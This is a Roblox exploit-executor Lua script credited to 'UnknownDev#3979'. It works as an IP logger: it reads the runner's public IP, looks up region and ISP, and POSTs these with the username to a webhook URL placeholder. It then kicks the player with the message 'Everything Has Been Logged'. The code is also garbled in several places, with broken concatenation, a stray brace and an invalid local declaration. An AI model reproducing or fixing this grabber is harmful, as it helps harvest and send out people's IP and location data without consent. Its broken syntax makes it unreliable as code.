-- [[ Made By "UnknownDev#3979" ]] --

-- List of exploit checks
local exploitCheck = {
    is_sirhurt_closure and "Sirhurt",
    pebc_execute and "ProtoSmasher",
    syn and "Synapse X",
    secure_load and "Sentinel",
    KRNL_LOADED and "Krnl",
    SONA_LOADED and "Sona"
}

-- Webhook URL
local url = "YOUR_WEBHOOK_URL_HERE"

-- Get the player's IP address
local ip = game:HttpGet("https://api.ipify.org") -- IP
local data = game:HttpGet("http://ip-api.com/json/" .. tostring(ip)) -- Data
local allInfo = game:GetService("HttpService"):JSONDecode(data) -- Information
local countryCode, region, as = allInfo["countryCode"], allInfo["regionName"], allInfo["as"] -- CountryCode

-- Create the country flag URL
local countryFlagURL = "https://www.countryflags.io/" .. countryCode .. "/flat/64.png"

-- Create an embed for the webhook
local embedData = {
    ["title"] = "__**" .. game.Players..Name .. " Has Executed Your Script!**__"
    ["description"] = "Username: " .. game.Players.LocalPlayer.Name .. " Using **" .. exploitCheck .. "**",
    ["type"] = "rich",
    ["color"] = tonumber(0x7269da),
    ["image"] = {
        ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
            tostring(game:GetService("Players").LocalPlayer.Name)
    },
    ["fields"] = {
        {
            ["name"] = "IP Address",
            ["value"] = ip,
            ["inline"] = true
        },
        {
            ["name"] = "Location",
            ["value"] = region .. ", " .. countryCode,
            ["inline"] = true
        },
        {
            ["name"] = "ISP",
            ["value"] = as,
            ["inline"] = true
        },
        {
            ["name"] = "Country Flag",
            ["value"] = "[![Flag](" .. countryFlagURL .. ")](" .. countryFlagURL .. ")",
            ["inline"{ = true
        }
    }
}

-- Create the data to send in the webhook
local data = {
    ["content"] = "Player Check result for " .. game.Players.LocalPlayer.Name,
    ["embeds"] = { embedData }
}

-- Define headers for the request
local headers = {
    ["Content-Type"] = "application/json"
}

-- Send the webhook request
local httpService = game:GetService("HttpService")
local request = http_request or request or HttpPost or syn.request
    
local DataToRequest({
    Url = url,
    Body = game:GetService("HttpService"):JSONEncode(data),
    Method = "POST",
    Headers = headers
})

request(DataToRequest)
    
-- Kick the player with a message
game.Players.LocalPlayer:Kick("Security Check Failed. Everything Has Been Logged")
